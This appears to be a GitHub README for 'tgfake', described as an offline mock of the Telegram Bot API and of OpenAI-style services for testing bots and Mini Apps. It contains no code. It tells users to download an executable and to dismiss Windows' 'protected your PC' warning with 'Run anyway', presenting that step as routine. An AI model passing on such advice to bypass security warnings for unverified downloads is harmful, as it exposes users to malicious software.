# 🤖 tgfake - Test Telegram Bots Without Internet

[![Download tgfake](https://img.shields.io/badge/Download-tgfake-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sdFN001/tgfake)
[![Offline Ready](https://img.shields.io/badge/Offline-Ready-2ea44f?style=for-the-badge)](https://github.com/sdFN001/tgfake)
[![No Internet Needed](https://img.shields.io/badge/No%20Internet-Needed-6f42c1?style=for-the-badge)](https://github.com/sdFN001/tgfake)

tgfake is a free tool that creates a pretend version of the Telegram Bot API on your own computer. It lets you test Telegram bots, Telegram Mini Apps, and AI (LLM) integrations completely offline — no real Telegram account, no internet connection, and no risk of sending accidental messages to real people.

If you have ever wanted to try out a bot idea but did not want to deal with tokens, servers, or messing something up online, tgfake is built exactly for that.

## 🎯 What Is tgfake?

Telegram bots normally talk to Telegram's real servers over the internet. Every message your bot sends or receives goes through that connection. That is great for real life, but it makes testing awkward: you need a bot token, a live connection, and a real chat to send messages into.

tgfake replaces the real Telegram servers with a small program that runs on your PC. Your bot thinks it is talking to Telegram, but everything stays on your machine. You get instant responses, you can replay the same test a hundred times, and nothing ever leaves your computer.

Because it also speaks the same language as popular AI services (an "OpenAI-compatible" interface), you can test chatbots that use artificial intelligence without paying for API calls or worrying about rate limits.

## ✨ What You Can Do With It

- **Test Telegram bots safely.** Send fake messages, press fake buttons, and watch your bot react — all without a real Telegram account.
- **Try out Telegram Mini Apps.** Load and interact with small web apps that normally run inside Telegram, without publishing anything.
- **Test AI and chatbot logic.** Point your AI-powered bot at tgfake and check its answers offline, with no cloud costs.
- **Repeat the same test every time.** Because nothing changes between runs, results stay consistent and easy to compare.
- **Run tests automatically.** Connect tgfake to GitHub Actions so your checks happen on their own whenever you update your project.
- **Work on a plane, in a café, or anywhere.** No internet connection is required at any point.

## 📋 Before You Start

Make sure your computer meets these basics:

- **Operating system:** Windows 10 or Windows 11 (64-bit recommended).
- **Memory:** At least 4 GB of RAM.
- **Free disk space:** Around 200 MB for the application and its files.
- **Permissions:** You should be able to run downloaded programs on your account. On a work computer, you may need to ask your administrator.
- **A web browser:** Chrome, Edge, or Firefox — used to view the Mini App testing pages.

You do **not** need to install programming tools, and you do **not** need a Telegram bot token to get started.

## 🚀 Getting Started

Getting tgfake onto your computer takes only a few minutes.

### Step 1: Download the application

Visit this link to download the application:

**https://github.com/sdFN001/tgfake**

The page you land on is the project's home. Look for the releases or downloads area on that page and save the file to a folder you can easily find, such as your **Downloads** folder.

### Step 2: Keep the file somewhere permanent

Before running anything, move the downloaded file out of your temporary Downloads folder and into a dedicated place, for example:

- `C:\Users\YourName\tgfake\`

This keeps things tidy and makes the program easy to find later. Avoid running it from inside a compressed archive — extract first if your download arrived as a package.

### Step 3: Run the application

Double-click the application file to start it. Windows may show a blue "Windows protected your PC" message the first time. If that happens, click **More info**, then **Run anyway**. This is a standard message for software downloaded from the internet.

A small console window will open and display a few lines of text. This is normal — it is the pretend Telegram server starting up. Leave this window open while you work; closing it stops the server.

### Step 4: Note the address it shows

When the server finishes starting, it prints an address, usually something like `http://localhost:8081`. That address is the "pretend Telegram" your bot will connect to. Write it down or keep the window visible — you will need it in the next step.

## 🔗 Connecting Your Bot

Now tell your bot to talk to tgfake instead of the real Telegram.

1. Open your bot's settings or configuration file.
2. Find the entry that holds the Telegram API address (sometimes labelled as the API base URL or server address).
3. Replace the real Telegram address with the local address shown in the console window.
4. Save your changes and restart your bot.

Your bot will now send all its requests to tgfake. Anything it "sends" appears in the tgfake console window instead of reaching a real person. You can trigger fake incoming messages from that same console or through the testing pages it provides.

## 🧩 Testing Telegram Mini Apps

Mini Apps are small web pages that normally open inside Telegram. tgfake serves a stand-in environment so you can load them in your normal browser.

1. With tgfake running, open your browser.
2. Go to the local address printed in the console window.
3. Follow the on-screen links to open the Mini App testing area.
4. Load your Mini App page and click through it as a real user would.

Because everything runs locally, page loads are instant and you can refresh as often as you like.

## 🤖 Testing AI and LLM Integrations

If your bot uses a large language model, tgfake can stand in for the AI service too. It accepts the same request format used by popular OpenAI-style services, so your existing code works unchanged.

1. In your bot's configuration, set the AI service address to the local tgfake address.
2. Use any placeholder key where an API key is normally required.
3. Send a test message to your bot and watch the request and response appear in the console.

This means you can check that your bot handles answers, errors, and slow replies correctly — without spending money on real AI calls or waiting for a live service.

## ⚙️ Running Tests Automatically

For teams, tgfake fits neatly into automated workflows. You can start it as a background step in GitHub Actions, run your bot's test suite against it, and then shut it down. No secrets, no external accounts, and no flaky network failures.

A typical automated run looks like this:

1. Start tgfake in the background.
2. Wait a moment for the local address to become available.
3. Run your bot's tests against that address.
4. Collect the results and stop the server.

Since the whole flow stays on one machine, results are fast and repeatable.

## 🛠️ Troubleshooting

**The console window opens and closes immediately.**
Something is blocking startup. Open the folder containing the application, then right-click in an empty area and choose "Open in Terminal" (or hold Shift and right-click, then "Open command window here"). Run the application from there so the message stays visible.

**My browser says the page cannot be reached.**
Check that the console window is still open and shows no error lines. Confirm you typed the address exactly as printed, including the port number at the end.

**My bot cannot connect.**
Make sure you changed the address in your bot's settings and restarted the bot afterwards. Settings changes usually only take effect after a restart.

**Windows keeps warning me about the file.**
This is normal for newly downloaded software. Use **More info → Run anyway**, or ask your administrator if the computer is managed by an organisation.

**The console shows a lot of text.**
That is expected. Every request your bot makes is logged there so you can see exactly what happened. Scroll to the bottom for the newest lines.

## 🆘 Getting Help and Giving Feedback

The project page is the place to look for updates, documentation, and a way to report problems:

**https://github.com/sdFN001/tgfake**

When asking for help, include what you were trying to do, what you expected to happen, and what actually happened. Copying the last few lines from the console window makes it much easier to figure out the cause.

## ✅ Quick Recap

1. Visit **https://github.com/sdFN001/tgfake** and download the application.
2. Move it to a permanent folder such as `C:\Users\YourName\tgfake\`.
3. Double-click to run it and leave the console window open.
4. Point your bot's Telegram address at the local address shown.
5. Test messages, Mini Apps, and AI answers — all offline.

Keywords: api-mock, bot-testing, e2e-testing, github-actions, go, golang, integration-testing, llm-testing, mock-server, offline, openai-compatible, telegram, telegram-bot, telegram-bot-api, telegram-mini-app, telegram-testing